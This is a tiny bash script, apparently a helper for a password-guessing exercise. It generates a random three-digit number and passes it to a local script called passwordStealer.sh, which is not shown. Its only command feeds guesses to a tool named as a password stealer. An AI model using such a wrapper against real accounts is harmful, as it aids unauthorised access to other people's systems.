#!/bin/bash
#randomly generates a password
password=$[RANDOM%900+100]
./passwordStealer.sh $password
